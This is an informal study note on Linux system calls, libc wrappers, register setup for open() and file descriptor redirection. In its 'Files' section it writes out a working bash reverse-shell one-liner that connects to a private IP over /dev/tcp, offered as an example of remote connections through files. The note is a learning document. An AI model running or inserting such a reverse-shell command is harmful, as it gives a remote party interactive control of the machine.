# Syscalls

A user level program can't directly perform OS level activities like instruction the CPU to go to sector 57 of the HDD and start writing there.

But a user level program can use system calls to instruct an OS to perform certain things which are allowed. This is achieved using syscalls in Linux.

Instruction in x86\_64 is "syscall". It is implemented by RAX and takes in arguments in rdi,rsi,rdx,r10,r8,r9

**man syscalls**

There are hundreds of these system calls for different functions.

Some OS level functionalities can be done by a user program without even using a syscall as well.

{% embed url="https://filippo.io/linux-syscall-table/" %}

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

So, system call 0 would read. That is: RAX,0

But to do this in C would be a headache. Properly calling RAX,0 with necessary arguments in rdi,rsi etc. is difficult. So C language has wrappers for these system calls called "libc" which will setup a system call properly for you while writing a program

Example:

<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

Here, syscall() is setting up an operation on /etc/passwd file. From the list, we see this is how paramters are setup:

<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

%rdi => Filename: /etc/passwd

%rsi=>Flags: R/W/X/A?

%rdx=> mode of accessing of you're creating it for the first time. R/W/X?

%rax => 2



Let's disassemble this code:

<figure><img src="../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>



Now even though the system call suggests rdi for filename, rsi for flags, rdx for mode and rax for system call number, we see something weird happening.

The order of assignment of these arguments is incorrect.

THis is because of the library wrapper

Since the library (syscall()) is taking in an extra number as input (first argument=2 here), taking in RDI, put that in RAX; then will take next one in RSI, put that in RDI and so on.

It shifts the call by one argument and makes the call

But the implementation remains the same.



Here, interesting thing to note is that syscall is returning a file descriptor which is an integer. So that when you tell it to write to file descriptor 20, it looks up wheteher you previously opened a file and it gave you back fd 20 and then writes to correct file. SO.....



## Files

On Unix-like OS, everything is a file!

* files
* sockets
* processes info (/proc)
* attached devices (/dev)
* system settings (/sys)

This makes it very nice to use basic tools like find, grep, awk to find what you need or we can use these files to even make remote connections!!

**bash -i >& /dev/tcp/10.10.100.120/80 0>&1**



Here, we are taking fd 0 input and redirecting to fd 1. It is redirecting whatever server sends on our terminal. How is this working?



## Standard File Descriptors

Standard file descriptors:

* 0: stdin->reading what user is inputting in the terminal
* 1: stdout->printing to the terminal
* 2: stderr->print to terminal an error message

When we are using "open" in a program, we get an fd back. This is a number used to ideentify the file. We can check them out: /proc/self/fd

Now, we can make a program and play with these file descriptors. If a program is throwing an error or writing something to the terminal, we can redirect it somewhere using FD.

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

Let's use FD to redirect thesee different write statements to different files. FD1 is redirecting first print statement to a file stdout.txt and stderr.txt using FD 2. When we are redirecting one FD, the other is printed normally.

<figure><img src="../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

This is useful especially when we are running a bash program (like find) and we have to redirect stderr somewhere to clean out the output a bit. We can redirect it to /dev/null which is a special file in Linux where you can throw all the junk and OS would never write anything to it. Sort of like disposing of waste output.

\>& is  bash feature to redirect both stdout and stderr to somewhere.

<figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

FD are program specific. So, 1 in my program won't conflict with another FD 1.

